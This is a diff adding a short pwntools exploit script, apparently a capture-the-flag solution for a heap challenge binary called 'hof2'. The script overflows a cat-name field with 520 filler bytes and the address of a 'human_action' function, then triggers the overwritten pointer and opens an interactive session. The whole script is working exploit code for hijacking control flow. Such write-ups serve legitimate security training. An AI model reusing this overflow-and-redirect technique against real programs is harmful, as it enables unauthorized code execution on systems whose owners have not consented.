@@ -1,0 +1,20 @@
+from pwn import *
+
+p = process("./hof2")
+e = ELF("./hof2")
+'''
+p = gdb.debug("./hof2", gdbscript = 
+b *add_cat
+)
+'''
+human_action = e.symbols['human_action']
+
+p.sendlineafter(b"> ", b"1")
+payload = b"A" * 520 + p64(human_action)
+p.sendlineafter(b"cat: ", payload)
+p.sendlineafter(b"age: ", b"20")
+
+p.sendlineafter(b"> ", b"3")
+p.sendlineafter(b"Index: ", b"0")
+
+p.interactive()
